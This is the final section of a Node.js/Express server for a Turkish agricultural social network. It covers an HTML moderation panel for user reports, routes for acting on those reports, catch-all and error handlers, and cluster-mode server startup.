        const rdMap = {spam:'🚫 Spam',hate:'😡 Nefret',violence:'⚠️ Şiddet',nsfw:'🔞 NSFW',misleading:'❗ Yanıltıcı',harassment:'👊 Taciz',copyright:'©️ Telif',other:'📝 Diğer'};
        const fmtD = d => d ? new Date(d).toLocaleString('tr-TR',{day:'2-digit',month:'2-digit',year:'numeric',hour:'2-digit',minute:'2-digit'}) : '—';

        const rows = reports.length === 0
            ? `<tr><td colspan="7"><div class="empty"><div style="font-size:44px;margin-bottom:10px">🎉</div>Bu filtrede şikayet yok.</div></td></tr>`
            : reports.map(r => {
                const postUrl = r.postId ? `${BASE_DOMAIN}/post/${r.postId}` : null;
                const postCell = postUrl ? `
                    <a class="pl" href="${postUrl}" target="_blank">🔗 Gönderiye Git</a>
                    ${r.postContent ? `<div class="pc" title="${escapeHtml(r.postContent)}">${escapeHtml(r.postContent.slice(0,55))}${r.postContent.length>55?'…':''}</div>` : ''}
                    ${r.postActive===false?'<div style="font-size:10px;color:#ef4444;margin-top:2px">⛔ Zaten kaldırıldı</div>':''}
                ` : '<span style="color:#334155;font-size:11px">Post silinmiş</span>';

                let actions = '';
                if (r.status === 'pending') {
                    actions = `<div class="ab">
                        ${r.postId && r.postActive!==false ? `
                        <form method="POST" action="/sikayet/action/${r.id}/remove-post" style="display:inline">
                            <button class="abn abn-del" type="submit" onclick="return confirm('Postu kaldırmak istiyor musunuz?')">🗑️ Postu Kaldır</button>
                        </form>` : ''}
                        <form method="POST" action="/sikayet/action/${r.id}/reviewed" style="display:inline">
                            <button class="abn abn-ok" type="submit">✅ İncelendi</button>
                        </form>
                        <form method="POST" action="/sikayet/action/${r.id}/dismissed" style="display:inline">
                            <button class="abn abn-dis" type="submit">❌ Kaldırma</button>
                        </form>
                    </div>`;
                } else {
                    const sb = r.status==='reviewed'?`<span class="badge bv">✅ İncelendi</span>`:r.status==='dismissed'?`<span class="badge bd">❌ Reddedildi</span>`:`<span class="badge bp">${r.status}</span>`;
                    actions = sb;
                }

                return `<tr>
                    <td><div class="uc"><div class="un">${escapeHtml(r.reporterName||'—')}</div><div class="ue">${escapeHtml(r.reporterEmail||'')}</div></div></td>
                    <td><span class="br-tag">${rdMap[r.reason]||r.reason||'—'}</span></td>
                    <td>${postCell}</td>
                    <td class="dc" style="max-width:160px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="${escapeHtml(r.description||'')}">${r.description?escapeHtml(r.description.slice(0,70))+(r.description.length>70?'…':''):'<span style="color:#334155">—</span>'}</td>
                    <td class="dc">${fmtD(r.createdAt)}</td>
                    <td>${actions}</td>
                </tr>`;
            }).join('');

        const filterLinks = [
            {val:'all',   label:`Tümü (${stats.total||0})`,    cls:'fa'},
            {val:'pending',  label:`⏳ Bekliyor (${stats.pending||0})`,  cls:'fa-y'},
            {val:'reviewed', label:`✅ İncelendi (${stats.reviewed||0})`, cls:'fa-g'},
            {val:'dismissed',label:`❌ Reddedildi (${stats.dismissed||0})`,cls:'fa-r'},
        ].map(f => `<a href="/sikayet/panel?durum=${f.val}" class="fb ${sf===f.val?f.cls:''}">${f.label}</a>`).join('');

        res.type('html').send(skHtml('Panel', `
        <div class="tb">
          <div class="tb-l"><div class="dot"></div>
            <div><div class="tb-title" style="display:flex;align-items:center"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" style="vertical-align:middle;margin-right:6px"><path d="M12 2 L20 6 L20 13 C20 17.5 16.5 21.3 12 23 C7.5 21.3 4 17.5 4 13 L4 6 Z" fill="#22c55e" stroke="#166534" stroke-width="1.5"/><path d="M9 12 L11 14 L15 10" stroke="white" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"/></svg>Şikayet Paneli</div><div class="tb-sub">Agro Sosyal</div></div>
          </div>
          <div class="tb-r">
            <span class="badge-em">👤 ${escapeHtml(req.skUser.fullName||req.skUser.email)}</span>
            <form method="POST" action="/sikayet/logout" style="display:inline">
              <button class="btn-out" type="submit">Çıkış</button>
            </form>
          </div>
        </div>
        <div class="wrap">
          <div class="stats">
            <div class="sc"><div class="sc-n" style="color:#f1f5f9">${stats.total||0}</div><div class="sc-l">Toplam</div></div>
            <div class="sc"><div class="sc-n" style="color:#fbbf24">${stats.pending||0}</div><div class="sc-l">⏳ Bekleyen</div></div>
            <div class="sc"><div class="sc-n" style="color:#4ade80">${stats.reviewed||0}</div><div class="sc-l">✅ İncelenen</div></div>
            <div class="sc"><div class="sc-n" style="color:#94a3b8">${stats.dismissed||0}</div><div class="sc-l">❌ Reddedilen</div></div>
          </div>
          <div class="filters">${filterLinks}</div>
          <div class="tw">
            <div class="th"><span class="th-t">🚨 Şikayetler</span><span style="font-size:12px;color:var(--m)">${reports.length} kayıt</span></div>
            <table>
              <thead><tr><th>Şikayet Eden</th><th>Neden</th><th>Gönderi</th><th>Açıklama</th><th>Tarih</th><th>İşlem</th></tr></thead>
              <tbody>${rows}</tbody>
            </table>
          </div>
        </div>`));
    } catch (err) {
        console.error('[Şikayet Panel]', err);
        res.status(500).type('html').send(skHtml('Hata',`<div style="text-align:center;padding:60px;color:#ef4444"><h2>Sunucu hatası: ${escapeHtml(err.message)}</h2></div>`));
    }
});

// ── 7. İŞLEM (İncele / Reddet / Postu Kaldır) ──────────────────────────────
app.post('/sikayet/action/:id/:action', requireSikayetAuth, async (req, res) => {
    try {
        const { id, action } = req.params;
        const back = req.headers.referer || '/sikayet/panel';

        if (action === 'remove-post') {
            const report = await dbGet(`SELECT "postId" FROM reports WHERE id=$1`, [id]);
            if (report?.postId) {
                await dbRun(`UPDATE posts SET "isActive"=FALSE, "updatedAt"=NOW() WHERE id=$1`, [report.postId]);
            }
            await dbRun(`UPDATE reports SET status='reviewed', "reviewedAt"=NOW(), "reviewedBy"=$1 WHERE id=$2`, [req.skUser.email, id]);
        } else if (['reviewed','dismissed'].includes(action)) {
            await dbRun(`UPDATE reports SET status=$1, "reviewedAt"=NOW(), "reviewedBy"=$2 WHERE id=$3`, [action, req.skUser.email, id]);
        }

        res.redirect(back);
    } catch (err) {
        console.error('[Şikayet Action]', err);
        res.redirect('/sikayet/panel');
    }
});


// ════════════════════════════════════════════════════════════════════
// 🔒 Bilinmeyen API rotaları için 404
// ════════════════════════════════════════════════════════════════════
app.all('/api/*', (req, res) => {
    return res.status(404).json({ error: 'Geçersiz istek' });
});

// GET /* (catch-all - Ana SPA için)
// Sub-app path'leri ve API'ler bu handler'a ulaşmaz
app.get('*', (req, res, next) => {
    const p = req.path;

    // API, uploads, sub-app'ler buraya düşmesin
    if (
        p.startsWith('/api/')     ||
        p.startsWith('/uploads/') ||
        p.startsWith('/agrolink') ||
        p.startsWith('/agro-hava') ||
        p.startsWith('/sikayet')
    ) return next();

    // public/<appname>/ alt-klasörü var mı? Onu sub-app router zaten handle etti
    // Ama statik dosya (JS/CSS/png) için düşmüşse → 404
    const firstSeg = p.split('/')[1]; // '' için '' döner
    if (firstSeg) {
        const subAppPath = path.join(__dirname, 'public', firstSeg);
        if (fssync.existsSync(subAppPath) && fssync.statSync(subAppPath).isDirectory()) {
            // Bu bir sub-app klasörü ama dosya bulunamadı → 404
            return res.status(404).json({ error: 'Dosya bulunamadı' });
        }
    }

    // Ana uygulama SPA
    const htmlPath = path.join(__dirname, 'public', 'index.html');
    const fss = require('fs');
    if (fss.existsSync(htmlPath)) {
        res.setHeader('Content-Type', 'text/html; charset=utf-8');
        res.setHeader('Cache-Control', 'no-cache');
        res.sendFile(htmlPath);
    } else {
        res.status(404).json({ error: 'Sayfa bulunamadı' });
    }
});

// ════════════════════════════════════════════════════════════════════
// 🔒 Global Express Error Handler — stack trace istemciye ASLA gitmez
// ════════════════════════════════════════════════════════════════════
// eslint-disable-next-line no-unused-vars
app.use((err, req, res, next) => {
    const status = err.status || err.statusCode || 500;
    // Stack trace'i sadece server log'una yaz
    console.error(`[HATA] ${req.method} ${req.path} →`, err.message);
    if (process.env.NODE_ENV === 'development') console.error(err.stack);
    // İstemciye sadece genel mesaj — sunucu detayı, dosya yolu, versiyon yok
    res.status(status).json({
        error: status >= 500 ? 'Sunucu hatası' : (err.message || 'Hata oluştu')
    });
});

// ==================== SUNUCU BAŞLAT ====================

const NUM_WORKERS = process.env.WEB_CONCURRENCY || Math.min(os.cpus().length, 4);

if (cluster.isPrimary || cluster.isMaster) {
    console.log(`🚀 Master process ${process.pid} - ${NUM_WORKERS} worker başlatılıyor...`);
    for (let i = 0; i < NUM_WORKERS; i++) { cluster.fork(); }
    cluster.on('exit', (worker, code) => {
        console.log(`⚠️ Worker ${worker.process.pid} kapandı (code: ${code}). Yeniden başlatılıyor...`);
        cluster.fork();
    });
} else {
    (async () => {
        try {
            await initializeDatabase();
            await migrateEncryptSensitiveColumns();
            await runSQLiteMigration();
            testEmailConnection().catch(() => {});
            server.listen(PORT, '0.0.0.0', async () => {
                console.log(`
╔══════════════════════════════════════════════════╗
║  🌾 AGROLINK SERVER - PostgreSQL v7.2             ║
║  📡 Port: ${String(PORT).padEnd(39)}║
║  🌐 Domain: sehitumitkestitarimmtal.com         ║
║  🗄️  DB: PostgreSQL (Pool: 100 bağlantı)        ║
║  🔒 SQL Injection: Tüm sorgular parameterize    ║
║  🎬 Video: FFmpeg+HLS ABR (YouTube Algoritması) ║
║  📹 Video Limit: 100MB | Mavi Tik: 300MB        ║
║  📰 Feed: Sadece takip edilenler gösterilir     ║
║  📧 E-posta: Nodemailer (SMTP)                  ║
║  📊 API: 103+ Rota                              ║
║  ⚡ Cluster Mode: Worker ${String(process.pid).padEnd(23)}║
║  🔥 1000+ Eşzamanlı İstek Desteği               ║
╚══════════════════════════════════════════════════╝
                `);
            });
        } catch (error) {
            console.error('❌ Sunucu başlatılamadı:', error);
            process.exit(1);
        }
    })();
}

// Graceful shutdown
process.on('SIGINT', async () => { console.log('\n🛑 Sunucu kapatılıyor...'); await pool.end(); process.exit(0); });
process.on('SIGTERM', async () => { console.log('\n🛑 Sunucu kapatılıyor...'); await pool.end(); process.exit(0); });
process.on('unhandledRejection', (reason) => { console.error('[UnhandledRejection]', reason?.message || String(reason)); });
process.on('uncaughtException', (error) => { console.error('[UncaughtException]', error.message); process.exit(1); });
